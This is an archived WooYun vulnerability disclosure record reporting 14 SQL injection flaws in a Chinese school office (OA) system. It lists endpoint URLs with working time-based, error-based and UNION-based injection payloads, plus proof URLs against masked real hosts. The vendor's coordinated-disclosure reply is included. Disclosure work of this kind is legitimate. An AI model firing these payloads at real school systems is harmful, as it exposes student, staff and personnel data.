{"id": 82509, "wybug_id": "wooyun-2015-0150846", "wybug_title": "Yfidea学校办公OA系统&lt;3.99版存在14处注入", "wybug_corp": "广州市颖峰信息科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-11-03 21:44", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 写漏洞证明是最辛苦的，此漏洞花了3小时从找出注入——测试注入——找出案例——各个案例测试——整理——写漏洞——证明漏洞截图——提交 详细说明：  #1：官方介绍：创想颖峰学校办公ＯＡ系统是一个学校综合管理平台，是您数字化校园管理的优良方案，本校园办公系统具备一般的网上办公功能，以简单，实用为原则，为学校各项工作提供一个网络平台，具备公告通知、我的日程、校内邮件、校内短信、成绩管理、部门文件、教师文件、网上备课、学籍管成绩理、校行事历、网上报修、人事管理等等功能，真真切切地提升学校信息化管理水平。#2：涉及产品：学校办公OA系统    涉及版本：3.99版以下#3：案例： 部分支持报错；部分显500错误的可以盲注\n**.**.**.**:8080/http://**.**.**.**/**.**.**.**:81/**.**.**.**/**.**.**.**:8081/**.**.**.**:8888/**.**.**.**:8888/**.**.**.**:88/http://**.**.**.**/**.**.**.**/**.**.**.**:8888/**.**.**.**:81/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**:81/http://**.**.**.**/bgoa/oa/\n #4：注入链接+Payload 适合直接给Tangscan插件\n1、/oa/bumenfile/newfile.asp?id=2'; waitfor delay '0:0:5'--2、/oa/gonggao/BiaoXinglist.asp?ftype=通知'); WAITFOR DELAY '0:0:5'--3、/oa/varset/modifyTime.asp?varname=&id= -1' UNION ALL SELECT NULL,NULL,NULL,ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32)),NULL,NULL,NULL--4、/oa/KeChengBiao/ModiKeCheng.asp?id=6'; WAITFOR DELAY '0:0:5'--5、/oa/student/ChengJiGenZong.asp?id=1' and @@version>0--6、/oa/kaoqin/QingJiaPi.asp?bumen=%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD&id=9'; waitfor delay '0:0:5'--7、/oa/student/fenduan.asp?selyears=&selgrade=&seltestname=&selsubject=1' and @@version=1--&manfen=100&buchang=20&submit1=查询8、/oa/email/delsend.asp?curpage=1&id=2'and @@version>0-- 9、/oa/student/mainsubject_zixuan.asp?selyears=&seltestname='/**/and/**/1=char(@@version)--&selgrade=&selclass=&submit1=%B2%E9%D1%AF&%CC%E5%D3%FD=%CC%E5%D3%FD10、/oa/email/delreceived.asp?curpage=1&id=44'and @@version>0-- 11、/oa/renshigongzi/modifyDangAn.asp?id=1'; waitfor delay '0:0:5'--12、/oa/kaoqin/QingJiaModify.asp?id=9' UNION ALL SELECT NULL,ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--13、/oa/email/dellajixiang.asp?curpage=1&id=1'and @@version>0--14、/oa/renshigongzi/xuexi.asp?tname=admin' UNION SELECT 1,2,@@version,user,@@servername,db_name(),7 from teachers--以下和第14处同一性质的：A2、/oa/renshigongzi/ViewDangAn.asp?tname=adminA3、/oa/renshigongzi/zhuanyejishu.asp?tname=adminA4、/oa/renshigongzi/Jixujiaoyu.asp?tname=adminA5、/oa/renshigongzi/huojiang.asp?tname=adminA6、/oa/renshigongzi/gongzuo.asp?tname=adminA7、/oa/renshigongzi/jiaoyu.asp?tname=adminA8、/oa/renshigongzi/jiating.asp?tname=admin\n   漏洞证明：  **.**.**.**:8080/oa/bumenfile/newfile.asp?id=2\n\nhttp://**.**.**.**/oa/gonggao/BiaoXinglist.asp?ftype=通知'); WAITFOR DELAY '0:0:5'--\n\n**.**.**.**:81/oa/varset/modifyTime.asp?varname=&id=%20-1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,ISNULL(CAST(@@version%20AS%20NVARCHAR(4000)),CHAR(32)),NULL,NULL,NULL--\n\n**.**.**.**:8888//oa/KeChengBiao/ModiKeCheng.asp?id=6'; WAITFOR DELAY '0:0:5'--\n\n**.**.**.**:8081/oa/student/ChengJiGenZong.asp?id=1' and @@version>0--\n\n**.**.**.**:8081/oa/kaoqin/QingJiaPi.asp?bumen=%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD&id=9'; waitfor delay '0:0:5'--\n\n**.**.**.**:8888/oa/student/fenduan.asp?selyears=&selgrade=&seltestname=&selsubject=1' and @@version=1--&manfen=100&buchang=20&submit1=查询\n\nhttp://**.**.**.**:81/oa/email/delsend.asp?curpage=1&id=2'and @@version>0-- \n\nhttp://**.**.**.**:81/oa/student/mainsubject_zixuan.asp?selyears=&seltestname='/**/and/**/1=char(@@version)--&selgrade=&selclass=&submit1=%B2%E9%D1%AF&%CC%E5%D3%FD=%CC%E5%D3%FD\n\nhttp://**.**.**.**/bgoa/oa/oa/email/delreceived.asp?curpage=1&id=44'and @@version>0--\n\n**.**.**.**:81/oa/renshigongzi/modifyDangAn.asp?id=1'; waitfor delay '0:0:5'--\n\n**.**.**.**:8888/oa/kaoqin/QingJiaModify.asp?id=9%27%20UNION%20ALL%20SELECT%20NULL,ISNULL(CAST(@@version%20AS%20NVARCHAR(4000)),CHAR(32)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--\n\n**.**.**.**:88//oa/email/dellajixiang.asp?curpage=1&id=1'and @@version>0--\n\n**.**.**.**:88//oa/renshigongzi/xuexi.asp?tname=admin%27%20UNION%20SELECT%201,2,@@version,user,@@servername,db_name(),7%20from%20teachers--\n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-11-06 16:03 厂商回复： CNVD确认并复现所述情况，已由CNVD通过软件生产厂商公开联系渠道向其邮件通报，由其后续提供解决方案并协调相关用户单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}